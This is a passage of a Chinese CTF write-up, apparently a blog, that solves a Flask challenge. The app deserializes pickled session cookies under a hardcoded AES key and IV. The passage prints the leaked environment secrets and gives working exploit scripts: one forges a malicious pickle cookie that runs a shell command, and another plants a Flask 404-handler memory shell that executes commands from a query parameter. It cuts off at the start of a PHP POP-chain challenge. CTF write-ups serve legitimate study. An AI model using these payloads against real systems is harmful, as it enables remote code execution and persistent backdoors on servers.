comment">#CBC模式需要确保IV是随机且不可预测的，但这里IV是从环境变量获取的固定值，每次加密使用相同的IV，这会带来安全隐患</span>    <span class="token keyword">if</span> mode <span class="token operator">==</span> <span class="token operator">&amp;</span><span class="token comment">#39;encrypt&amp;#39;:</span>        encryptor <span class="token operator">=</span> cipher<span class="token punctuation">.</span>encryptor<span class="token punctuation">(</span><span class="token punctuation">)</span>        padder <span class="token operator">=</span> padding<span class="token punctuation">.</span>PKCS7<span class="token punctuation">(</span>algorithms<span class="token punctuation">.</span>AES<span class="token punctuation">.</span>block_size<span class="token punctuation">)</span><span class="token punctuation">.</span>padder<span class="token punctuation">(</span><span class="token punctuation">)</span>        padded_data <span class="token operator">=</span> padder<span class="token punctuation">.</span>update<span class="token punctuation">(</span>data<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> padder<span class="token punctuation">.</span>finalize<span class="token punctuation">(</span><span class="token punctuation">)</span>        result <span class="token operator">=</span> encryptor<span class="token punctuation">.</span>update<span class="token punctuation">(</span>padded_data<span class="token punctuation">)</span> <span class="token operator">+</span> encryptor<span class="token punctuation">.</span>finalize<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>      <span class="token keyword">elif</span> mode <span class="token operator">==</span> <span class="token operator">&amp;</span><span class="token comment">#39;decrypt&amp;#39;:</span>        decryptor <span class="token operator">=</span> cipher<span class="token punctuation">.</span>decryptor<span class="token punctuation">(</span><span class="token punctuation">)</span>        encrypted_data_bytes <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>data<span class="token punctuation">)</span>        decrypted_data <span class="token operator">=</span> decryptor<span class="token punctuation">.</span>update<span class="token punctuation">(</span>encrypted_data_bytes<span class="token punctuation">)</span> <span class="token operator">+</span> decryptor<span class="token punctuation">.</span>finalize<span class="token punctuation">(</span><span class="token punctuation">)</span>        unpadder <span class="token operator">=</span> padding<span class="token punctuation">.</span>PKCS7<span class="token punctuation">(</span>algorithms<span class="token punctuation">.</span>AES<span class="token punctuation">.</span>block_size<span class="token punctuation">)</span><span class="token punctuation">.</span>unpadder<span class="token punctuation">(</span><span class="token punctuation">)</span>        unpadded_data <span class="token operator">=</span> unpadder<span class="token punctuation">.</span>update<span class="token punctuation">(</span>decrypted_data<span class="token punctuation">)</span> <span class="token operator">+</span> unpadder<span class="token punctuation">.</span>finalize<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> unpadded_data<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>users <span class="token operator">=</span> <span class="token punctuation">{</span>    <span class="token operator">&amp;</span><span class="token comment">#34;admin&amp;#34;: &amp;#34;admin123&amp;#34;,</span><span class="token punctuation">}</span><span class="token keyword">def</span> <span class="token function">create_session</span><span class="token punctuation">(</span>username<span class="token punctuation">)</span><span class="token punctuation">:</span>    session_data <span class="token operator">=</span> <span class="token punctuation">{</span>        <span class="token operator">&amp;</span><span class="token comment">#34;username&amp;#34;: username,</span>        <span class="token operator">&amp;</span><span class="token comment">#34;expires&amp;#34;: time.time() + 3600  </span>    <span class="token punctuation">}</span>    pickled <span class="token operator">=</span> pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>session_data<span class="token punctuation">)</span><span class="token comment">#pickle序列化会话数据</span>    pickled_data <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>pickled<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token comment">#39;utf-8&amp;#39;)#使用 base64.b64encode() 方法对序列化后的数据进行 Base64 编码，然后使用 decode() 方法将编码后的字节数据解码为字符串 pickled_data。</span>    key<span class="token punctuation">,</span>iv<span class="token operator">=</span>generate_key_iv<span class="token punctuation">(</span><span class="token punctuation">)</span>    session<span class="token operator">=</span>aes_encrypt_decrypt<span class="token punctuation">(</span>pickled_data<span class="token punctuation">,</span> key<span class="token punctuation">,</span> iv<span class="token punctuation">,</span>mode<span class="token operator">=</span><span class="token operator">&amp;</span><span class="token comment">#39;encrypt&amp;#39;)#AES加密</span>    <span class="token keyword">return</span> session<span class="token keyword">def</span> <span class="token function">dowload_file</span><span class="token punctuation">(</span>filename<span class="token punctuation">)</span><span class="token punctuation">:</span>    path<span class="token operator">=</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token comment">#34;static&amp;#34;,filename)</span>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>path<span class="token punctuation">,</span> <span class="token operator">&amp;</span><span class="token comment">#39;rb&amp;#39;) as f:</span>        data<span class="token operator">=</span>f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token comment">#39;utf-8&amp;#39;)</span>    <span class="token keyword">return</span> data<span class="token keyword">def</span> <span class="token function">validate_session</span><span class="token punctuation">(</span>cookie<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        key<span class="token punctuation">,</span> iv <span class="token operator">=</span> generate_key_iv<span class="token punctuation">(</span><span class="token punctuation">)</span>        pickled <span class="token operator">=</span> aes_encrypt_decrypt<span class="token punctuation">(</span>cookie<span class="token punctuation">,</span> key<span class="token punctuation">,</span> iv<span class="token punctuation">,</span>mode<span class="token operator">=</span><span class="token operator">&amp;</span><span class="token comment">#39;decrypt&amp;#39;)</span>        pickled_data<span class="token operator">=</span>base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>pickled<span class="token punctuation">)</span>        session_data <span class="token operator">=</span> pickle<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>pickled_data<span class="token punctuation">)</span>        <span class="token keyword">if</span> session_data<span class="token punctuation">[</span><span class="token operator">&amp;</span><span class="token comment">#34;username&amp;#34;] !=&amp;#34;admin&amp;#34;:</span>            <span class="token keyword">return</span> <span class="token boolean">False</span>        <span class="token keyword">return</span> session_data <span class="token keyword">if</span> session_data<span class="token punctuation">[</span><span class="token operator">&amp;</span><span class="token comment">#34;expires&amp;#34;] &amp;gt; time.time() else False</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">False</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token comment">#34;/&amp;#34;,methods=[&amp;#39;GET&amp;#39;,&amp;#39;POST&amp;#39;])</span><span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token operator">&amp;</span><span class="token comment">#34;session&amp;#34; in request.cookies:</span>        session <span class="token operator">=</span> validate_session<span class="token punctuation">(</span>request<span class="token punctuation">.</span>cookies<span class="token punctuation">[</span><span class="token operator">&amp;</span><span class="token comment">#34;session&amp;#34;])</span>        <span class="token keyword">if</span> session<span class="token punctuation">:</span>            data<span class="token operator">=</span><span class="token operator">&amp;</span><span class="token comment">#34;&amp;#34;</span>            filename<span class="token operator">=</span>request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token comment">#34;filename&amp;#34;)</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>filename<span class="token punctuation">)</span><span class="token punctuation">:</span>                data<span class="token operator">=</span>dowload_file<span class="token punctuation">(</span>filename<span class="token punctuation">)</span>            <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token comment">#34;index.html&amp;#34;,name=session[&amp;#39;username&amp;#39;],file_data=data)</span>    <span class="token keyword">return</span> redirect<span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token comment">#34;/login&amp;#34;)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token comment">#34;/login&amp;#34;, methods=[&amp;#34;GET&amp;#34;, &amp;#34;POST&amp;#34;])</span><span class="token keyword">def</span> <span class="token function">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token operator">&amp;</span><span class="token comment">#34;POST&amp;#34;:</span>        username <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token comment">#34;username&amp;#34;)</span>        password <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token comment">#34;password&amp;#34;)</span>        <span class="token keyword">if</span> users<span class="token punctuation">.</span>get<span class="token punctuation">(</span>username<span class="token punctuation">)</span> <span class="token operator">==</span> password<span class="token punctuation">:</span>            resp <span class="token operator">=</span> make_response<span class="token punctuation">(</span>redirect<span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token comment">#34;/&amp;#34;))</span>            resp<span class="token punctuation">.</span>set_cookie<span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token comment">#34;session&amp;#34;, create_session(username))</span>            <span class="token keyword">return</span> resp        <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token comment">#34;login.html&amp;#34;,error=&amp;#34;Invalid username or password&amp;#34;)</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token comment">#34;login.html&amp;#34;)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token comment">#34;/logout&amp;#34;)</span><span class="token keyword">def</span> <span class="token function">logout</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    resp <span class="token operator">=</span> make_response<span class="token punctuation">(</span>redirect<span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token comment">#34;/login&amp;#34;))</span>    resp<span class="token punctuation">.</span>delete_cookie<span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token comment">#34;session&amp;#34;)</span>    <span class="token keyword">return</span> resp<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token operator">&amp;</span><span class="token comment">#34;__main__&amp;#34;:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token operator">&amp;</span><span class="token comment">#34;0.0.0.0&amp;#34;,debug=False)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python">PYTHON_SHA256<span class="token operator">=</span>bfb249609990220491a1b92850a07135ed0831e41738cf681d63cf01b2a8fbd1HOSTNAME<span class="token operator">=</span>6172baf993ab4edfPYTHON_VERSION<span class="token operator">=</span><span class="token number">3.10</span><span class="token number">.16</span>PWD<span class="token operator">=</span><span class="token operator">/</span>appHOME<span class="token operator">=</span><span class="token operator">/</span>rootLANG<span class="token operator">=</span>C<span class="token punctuation">.</span>UTF<span class="token operator">-</span><span class="token number">8</span>GPG_KEY<span class="token operator">=</span>A035C8C19219BA821ECEA86B64E628F8D684696DFLAG<span class="token operator">=</span>no_FLAGSECRET_key<span class="token operator">=</span>ajwdopldwjdowpajdmslkmwjrfhgnbbvSHLVL<span class="token operator">=</span><span class="token number">1</span>PATH<span class="token operator">=</span><span class="token operator">/</span>usr<span class="token operator">/</span>local<span class="token operator">/</span><span class="token builtin">bin</span><span class="token punctuation">:</span><span class="token operator">/</span>usr<span class="token operator">/</span>local<span class="token operator">/</span>sbin<span class="token punctuation">:</span><span class="token operator">/</span>usr<span class="token operator">/</span>local<span class="token operator">/</span><span class="token builtin">bin</span><span class="token punctuation">:</span><span class="token operator">/</span>usr<span class="token operator">/</span>sbin<span class="token punctuation">:</span><span class="token operator">/</span>usr<span class="token operator">/</span><span class="token builtin">bin</span><span class="token punctuation">:</span><span class="token operator">/</span>sbin<span class="token punctuation">:</span><span class="token operator">/</span><span class="token builtin">bin</span>SECRET_iv<span class="token operator">=</span>asdwdggiouewhgpw_<span class="token operator">=</span><span class="token operator">/</span>usr<span class="token operator">/</span>local<span class="token operator">/</span><span class="token builtin">bin</span><span class="token operator">/</span>flaskOLDPWD<span class="token operator">=</span><span class="token operator">/</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>将fake_flag.txt移除并重创一个新的并写进ls /</p><p><a href="https://xz.aliyun.com/news/7032?time__1311=YqfxgD2D0A0=DtD/WrWqiqSxjhl8qkHHa4D&amp;u_atoken=8ce8b2be4a626f7c63df82432c7d562a&amp;u_asig=1a0c399f17418658718784440e003f">文章 - pickle反序列化初探 - 先知社区</a></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> pickle<span class="token keyword">import</span> base64<span class="token keyword">from</span> cryptography<span class="token punctuation">.</span>hazmat<span class="token punctuation">.</span>primitives<span class="token punctuation">.</span>ciphers <span class="token keyword">import</span> Cipher<span class="token punctuation">,</span> algorithms<span class="token punctuation">,</span> modes<span class="token keyword">from</span> cryptography<span class="token punctuation">.</span>hazmat<span class="token punctuation">.</span>backends <span class="token keyword">import</span> default_backend<span class="token keyword">from</span> cryptography<span class="token punctuation">.</span>hazmat<span class="token punctuation">.</span>primitives <span class="token keyword">import</span> padding<span class="token keyword">import</span> time<span class="token keyword">import</span> os<span class="token comment"># 生成密钥和IV</span><span class="token keyword">def</span> <span class="token function">generate_key_iv</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    KEY <span class="token operator">=</span> <span class="token string">"ajwdopldwjdowpajdmslkmwjrfhgnbbv"</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span>    IV <span class="token operator">=</span> <span class="token string">"asdwdggiouewhgpw"</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> KEY<span class="token punctuation">,</span> IV<span class="token comment"># AES加密函数</span><span class="token keyword">def</span> <span class="token function">aes_encrypt_decrypt</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span> key<span class="token punctuation">,</span> iv<span class="token punctuation">,</span> mode<span class="token operator">=</span><span class="token string">'encrypt'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    cipher <span class="token operator">=</span> Cipher<span class="token punctuation">(</span>algorithms<span class="token punctuation">.</span>AES<span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">,</span> modes<span class="token punctuation">.</span>CBC<span class="token punctuation">(</span>iv<span class="token punctuation">)</span><span class="token punctuation">,</span> backend<span class="token operator">=</span>default_backend<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> mode <span class="token operator">==</span> <span class="token string">'encrypt'</span><span class="token punctuation">:</span>        encryptor <span class="token operator">=</span> cipher<span class="token punctuation">.</span>encryptor<span class="token punctuation">(</span><span class="token punctuation">)</span>        padder <span class="token operator">=</span> padding<span class="token punctuation">.</span>PKCS7<span class="token punctuation">(</span>algorithms<span class="token punctuation">.</span>AES<span class="token punctuation">.</span>block_size<span class="token punctuation">)</span><span class="token punctuation">.</span>padder<span class="token punctuation">(</span><span class="token punctuation">)</span>        padded_data <span class="token operator">=</span> padder<span class="token punctuation">.</span>update<span class="token punctuation">(</span>data<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> padder<span class="token punctuation">.</span>finalize<span class="token punctuation">(</span><span class="token punctuation">)</span>        result <span class="token operator">=</span> encryptor<span class="token punctuation">.</span>update<span class="token punctuation">(</span>padded_data<span class="token punctuation">)</span> <span class="token operator">+</span> encryptor<span class="token punctuation">.</span>finalize<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment"># 创建恶意session</span><span class="token keyword">def</span> <span class="token function">create_malicious_session</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># 创建恶意的python对象</span><span class="token comment">#reduce一次只能执行一个函数，当exec被禁用时，就不能一次执行多条指令了），而需要手动拼接或构造opcode了，按理说这里用reduce也行，但试了下不行，这是为什么？？？</span>    opcode <span class="token operator">=</span> <span class="token triple-quoted-string string">b'''(cossystemS'ls / &gt; /app/static/fake_flag.txt'o.'''</span>    <span class="token comment"># Base64编码</span>    pickled_data <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>opcode<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>    <span class="token comment"># AES加密</span>    key<span class="token punctuation">,</span> iv <span class="token operator">=</span> generate_key_iv<span class="token punctuation">(</span><span class="token punctuation">)</span>    encrypted_session <span class="token operator">=</span> aes_encrypt_decrypt<span class="token punctuation">(</span>pickled_data<span class="token punctuation">,</span> key<span class="token punctuation">,</span> iv<span class="token punctuation">,</span> mode<span class="token operator">=</span><span class="token string">'encrypt'</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> encrypted_session<span class="token comment"># 生成恶意cookie</span>malicious_cookie <span class="token operator">=</span> create_malicious_session<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"恶意Cookie值:"</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>malicious_cookie<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\n将此值设置为session cookie，然后访问网站根路径"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>用生成的session访问后再次用admin的session访问fake_flag.txt即可</p><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/9d401ee18cb58d0b66eba9dfcc43f6fa.png"></p><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/d599fbaed9cf9974b7df89170c2be881.png"></p><p>用内存马<a href="https://xz.aliyun.com/news/13976?time__1311=eqUxuDcDgGYDq2xBkFDnDm2g8FDtqObq4D&amp;u_atoken=20a9bdcfd11fe33d2ee4eb0cdf43dd3e&amp;u_asig=1a0c399817420055481496984e0040">文章 - 新版Flask框架下用钩子函数实现内存马的方式 - 先知社区</a></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> os<span class="token keyword">import</span> requests<span class="token keyword">import</span> pickle<span class="token keyword">import</span> base64<span class="token keyword">from</span> cryptography<span class="token punctuation">.</span>hazmat<span class="token punctuation">.</span>primitives<span class="token punctuation">.</span>ciphers <span class="token keyword">import</span> Cipher<span class="token punctuation">,</span> algorithms<span class="token punctuation">,</span> modes<span class="token keyword">from</span> cryptography<span class="token punctuation">.</span>hazmat<span class="token punctuation">.</span>backends <span class="token keyword">import</span> default_backend<span class="token keyword">from</span> cryptography<span class="token punctuation">.</span>hazmat<span class="token punctuation">.</span>primitives <span class="token keyword">import</span> paddingkey <span class="token operator">=</span> <span class="token string">b'ajwdopldwjdowpajdmslkmwjrfhgnbbv'</span>iv <span class="token operator">=</span> <span class="token string">b'asdwdggiouewhgpw'</span><span class="token comment"># 生成恶意Payload</span><span class="token keyword">class</span> <span class="token class-name">Exploit</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__reduce__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token keyword">exec</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token string">"global exc_class;global code;exc_class, code = app._get_exc_class_and_code(404);app.error_handler_spec[None][code][exc_class] = lambda a:__import__('os').popen(request.args.get('shell')).read()"</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#随便访问一个不存在的界面造成404，再往shell里rce</span><span class="token comment"># AES 加密和解密函数（⼀个函数处理加密和解密）</span><span class="token keyword">def</span> <span class="token function">aes_encrypt_decrypt</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span> key<span class="token punctuation">,</span> iv<span class="token punctuation">,</span> mode<span class="token operator">=</span><span class="token string">'encrypt'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># 创建加密器/解密器</span>    cipher <span class="token operator">=</span> Cipher<span class="token punctuation">(</span>algorithms<span class="token punctuation">.</span>AES<span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">,</span> modes<span class="token punctuation">.</span>CBC<span class="token punctuation">(</span>iv<span class="token punctuation">)</span><span class="token punctuation">,</span> backend<span class="token operator">=</span>default_backend<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> mode <span class="token operator">==</span> <span class="token string">'encrypt'</span><span class="token punctuation">:</span>        encryptor <span class="token operator">=</span> cipher<span class="token punctuation">.</span>encryptor<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token comment"># 数据填充，确保数据的⻓度是AES块⼤⼩的倍数</span>        padder <span class="token operator">=</span> padding<span class="token punctuation">.</span>PKCS7<span class="token punctuation">(</span>algorithms<span class="token punctuation">.</span>AES<span class="token punctuation">.</span>block_size<span class="token punctuation">)</span><span class="token punctuation">.</span>padder<span class="token punctuation">(</span><span class="token punctuation">)</span>        padded_data <span class="token operator">=</span> padder<span class="token punctuation">.</span>update<span class="token punctuation">(</span>data<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> padder<span class="token punctuation">.</span>finalize<span class="token punctuation">(</span><span class="token punctuation">)</span>        result <span class="token operator">=</span> encryptor<span class="token punctuation">.</span>update<span class="token punctuation">(</span>padded_data<span class="token punctuation">)</span> <span class="token operator">+</span> encryptor<span class="token punctuation">.</span>finalize<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># 返回加密后的数据（Base64编码）</span>    <span class="token keyword">elif</span> mode <span class="token operator">==</span> <span class="token string">'decrypt'</span><span class="token punctuation">:</span>        decryptor <span class="token operator">=</span> cipher<span class="token punctuation">.</span>decryptor<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token comment"># 解密数据</span>        encrypted_data_bytes <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>data<span class="token punctuation">)</span>        decrypted_data <span class="token operator">=</span> decryptor<span class="token punctuation">.</span>update<span class="token punctuation">(</span>encrypted_data_bytes<span class="token punctuation">)</span> <span class="token operator">+</span> decryptor<span class="token punctuation">.</span>finalize<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token comment"># 去除填充</span>        unpadder <span class="token operator">=</span> padding<span class="token punctuation">.</span>PKCS7<span class="token punctuation">(</span>algorithms<span class="token punctuation">.</span>AES<span class="token punctuation">.</span>block_size<span class="token punctuation">)</span><span class="token punctuation">.</span>unpadder<span class="token punctuation">(</span><span class="token punctuation">)</span>        unpadded_data <span class="token operator">=</span> unpadder<span class="token punctuation">.</span>update<span class="token punctuation">(</span>decrypted_data<span class="token punctuation">)</span> <span class="token operator">+</span> unpadder<span class="token punctuation">.</span>finalize<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> unpadded_data<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>e <span class="token operator">=</span> Exploit<span class="token punctuation">(</span><span class="token punctuation">)</span>pickled <span class="token operator">=</span> pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>e<span class="token punctuation">)</span>pickled_data <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>pickled<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>session <span class="token operator">=</span> aes_encrypt_decrypt<span class="token punctuation">(</span>pickled_data<span class="token punctuation">,</span> key<span class="token punctuation">,</span> iv<span class="token punctuation">,</span> mode<span class="token operator">=</span><span class="token string">'encrypt'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"session="</span><span class="token punctuation">,</span> session<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h3 id="Popppppp-2"><a href="#Popppppp-2" class="headerlink" title="Popppppp(2)"></a>Popppppp(2)</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">&lt;</span> <span class="token operator">?</span>php<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">CherryBlossom</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$fruit1</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$fruit2</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">fruit1</span> <span class="token operator">=</span> <span class="token variable">$a</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">fruit1</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$newFunc</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">fruit2</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$newFunc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Forbidden</span> <span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token variable">$fruit3</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$string</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">fruit3</span> <span class="token operator">=</span> <span class="token variable">$string</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__get</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$var</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token variable">$name</span><span class="token punctuation">;</span>        <span class="token variable">$var</span><span 